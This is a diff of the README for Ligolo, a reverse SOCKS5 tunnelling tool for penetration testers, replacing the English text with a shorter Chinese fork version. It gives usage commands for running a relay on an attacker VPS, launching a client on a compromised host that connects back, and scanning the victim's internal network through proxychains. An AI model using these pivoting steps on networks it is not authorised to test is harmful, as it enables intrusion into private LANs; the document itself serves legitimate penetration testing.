@@ -1,193 +1,116 @@
-# Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
+# Ligolo : 用于内网渗透的反向隧道
 
 [![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
 [![forthebadge](https://forthebadge.com/images/badges/gluten-free.svg)](https://forthebadge.com)
 
-![Ligolo](img/ligolo.png)
+## 介绍
 
-<!-- START doctoc generated TOC please keep comment here to allow auto update -->
-<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
-## Table of Contents
+项目根据 [ligolo](https://github.com/sysdream/ligolo) 修改,主要做一些功能上的裁剪,方便使用.
 
-- [Introduction](#introduction)
-- [Use case](#use-case)
-- [Quick Demo](#quick-demo)
-- [Performance](#performance)
-- [Usage](#usage)
-  - [Setup / Compiling](#setup--compiling)
-  - [How to use?](#how-to-use)
-  - [TL;DR](#tldr)
-  - [Options](#options)
-- [Features](#features)
-- [To Do](#to-do)
-- [Licensing](#licensing)
-- [Credits](#credits)
+**Ligolo** 是一个简单的,轻量级的反向Socks5代理工具,所有的流量使用TLS加密.
 
-<!-- END doctoc generated TOC please keep comment here to allow auto update -->
+其功能类似于*Meterpreter*中的*Autoroute + Socks4a*,但是更加稳定,速度更快.
 
-## Introduction
+## 使用场景
 
-**Ligolo** is a *simple* and *lightweight* tool for establishing *SOCKS5* or *TCP* tunnels from a reverse connection in complete safety (TLS certificate with elliptical curve).
+当你已经在对方内网获取到一台 Windows / Linux / Mac 主机的权限且该主机可以连接互联网.
 
-It is comparable to *Meterpreter* with *Autoroute + Socks4a*, but more stable and faster.
+此时你想要建立一个对方内网的Socks5代理.
 
-## Use case
+**Ligolo** 可以帮助你建立代理,协助你继续进行内网渗透.
 
-You compromised a Windows / Linux / Mac server during your external audit. This server is located inside a LAN network and
-you want to establish connections to other machines on this network.
+> 如果已控主机不能访问互联网,可以尝试使用另一款工具 [pystinger](https://github.com/FunnyWolf/pystinger)
 
-**Ligolo** can setup a tunnel to access internal server's resources.
-
-## Quick Demo
-
-Relay of a RDP connection using Proxychains (WAN).
-
-![RDP](img/rdesktop_example.gif)
-
-## Performance
-
-Here is a screenshot of a speedtest between two 100mb/s hosts (ligolo / localrelay). Performance may vary depending on the system and network configuration.
-
-![Speedtest](img/speedtest.png)
-
-## Usage
-
-### Setup / Compiling
-
-Make sure *Go* is installed and working.
-
-1. Get Ligolo and dependencies
-
-```
-cd `go env GOPATH`/src
-git clone https://github.com/sysdream/ligolo
-cd ligolo
-make dep
-```
-
-2. Generate self-signed TLS certificates (will be placed in the *certs* folder)
-
-```
-make certs TLS_HOST=example.com
-```
-
-NOTE: You can also use your own certificates by using the `TLS_CERT` make option when calling *build*. Example: `make build-all TLS_CERT=certs/mycert.pem`.
-
-3. Build
-
-* 3.1. For all architectures
-
-```
-make build-all
-```
-
-* 3.2. (or) For the current architecture
-
-```
-make build
-```
-
-### How to use?
-
-*Ligolo* consists of two modules:
-
-- localrelay
-- ligolo
-
-*Localrelay* is intended to be launched on the control server (the attacker server).
-
-*Ligolo* is the program to run on the target computer.
-
-For *localrelay*, you can leave the default options. It will listen on every interface on port 5555 and wait for connections from *ligolo* (`-relayserver` parameter).
-
-For *ligolo*, you must specify the IP address of the relay server (or your attack server) using the `-relayserver ip:port` parameter.
-
-You can use the `-h` option for help.
-
-Once the connection has been established between *Ligolo* and *LocalRelay*, a *SOCKS5* proxy will be set up on TCP port `1080` on the relay server (you can change the TCP address/port using the *-localserver* option).
-
-After that, all you have to do is use your favorite tool (Proxychains for example), and explore the client's LAN network.
+## 使用方法
 
 ### TL;DR
 
-On your attack server.
+- 获取已编译的二进制文件 [release](https://github.com/funnywolf/ligolo/releases)
+
+- 在你的VPS主机中.
 
 ```
-./bin/localrelay_linux_amd64
+./ligolos
 ```
 
-On the compromise host.
+- 在已控制的内网主机中.
 
 ```
-> ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
+> ligoloc.exe -s your-vps-ip:443
 ```
 
-Once the connection is established, set the following parameters on the ProxyChains config file (On the attack server):
+- 连接建立成功后,此时VPS的127.0.0.1:1080已经建立已控主机的内网Socks5代理.
+
+### 详细说明
+
+*Ligolo* 包含两个模块:
+
+- ligolos (server)
+- ligoloc (client)
+
+*ligolos* 运行于你的VPS服务器 (攻击服务器).
+
+*ligoloc* 运行于已经控制的内网主机.
+
+*ligolos*可以使用默认设置.它会监听0.0.0.0:443端口(用于等待ligoloc连接)及127.0.0.1:1080(用于socks5代理).
+
+*ligoloc*运行时必须制定服务端地址,使用参数`-s your-vps-ip:443`.
+
+你可以使用`-h`参数查看帮助.
+
+一旦*ligolos* 和 *ligoloc* 之间的连接建立成功,你即可使用VPS服务器`127.0.0.1:1080`的内网socks5代理.
+
+### 选项
+
+*ligolos* options:
 
 ```
-[ProxyList]
-# add proxy here ...
-# meanwile
-# defaults set to "tor"
-socks5     127.0.0.1 1080
+PS XXX\bin> .\ligolos_windows_amd64.exe -h
+Usage of D:\Code\git\go\src\ligolo\bin\ligolos_windows_amd64.exe:
+  -cert string
+        The TLS server certificate,Unnecessary (default "cert.pem")
+  -key string
+        The TLS server key,Unnecessary (default "key.pem")
+  -l string
+        The relay server listening address (the connect-back address) (default "0.0.0.0:443")
+  -s5 string
+        The local socks5 server address (your proxychains parameter) (default "127.0.0.1:1080")
 ```
 
-Profit.
+*ligoloc* options:
 
 ```
-$ proxychains nmap -sT 10.0.0.0/24 -p 80 -Pn -A
-$ proxychains rdesktop 10.0.0.123
+PS XXX\bin> .\ligoloc_windows_amd64.exe -h
+Usage of D:\Code\git\go\src\ligolo\bin\ligoloc_windows_amd64.exe:
+  -s string
+        The relay server (the connect-back address) (default "example.com:443")
 ```
 
-### Options
+### 编译
 
-*Localrelay* options:
+参考原版ligolo的编译方法
 
-```
-Usage of localrelay:
-  -certfile string
-    	The TLS server certificate (default "certs/server.crt")
-  -keyfile string
-    	The TLS server key (default "certs/server.key")
-  -localserver string
-    	The local server address (your proxychains parameter) (default "127.0.0.1:1080")
-  -relayserver string
-    	The relay server listening address (the connect-back address) (default "0.0.0.0:5555")
-```
+## 特性
 
-*Ligolo* options:
-
-```
-Usage of ligolo:
-  -autorestart
-    	Attempt to reconnect in case of an exception
-  -relayserver string
-    	The relay server (the connect-back address) (default "127.0.0.1:5555")
-  -skipverify
-    	Skip TLS certificate pinning verification
-  -targetserver string
-    	The destination server (a RDP client, SSH server, etc.) - when not specified, Ligolo starts a socks5 proxy server
-```
-
-## Features
-
-- TLS 1.3 tunnel with TLS pinning
-- Multiplatforms (Windows / Linux / Mac / ...)
-- Multiplexing (1 TCP connection for all flows)
-- SOCKS5 proxy or simple relay
+- TLS 1.3 加密隧道
+- 多平台 (Windows / Linux / Mac / ...)
+- 多连接复用 (1 TCP连接传输所有流量)
+- SOCKS5代理
 
 ## To Do
 
-- Better timeout handling
-- SOCKS5 UDP support
-- Implement mTLS
+- 更好的超时机制
+- SOCKS5 UDP 支持
+- mTLS双向认证
+- 反向端口映射 (映射内网端口到互联网)
 
 ## Licensing
 
-GNU General Public License v3.0 (See LICENSING).
+GNU General Public License v3.0 (参考 LICENSING).
 
-## Credits
+## 原版作者
 
 * Nicolas Chatelain <n.chatelain -at- sysdream.com>
 
-[![Sysdream](img/logo_sysdream.png)](https://sysdream.com)
+
+
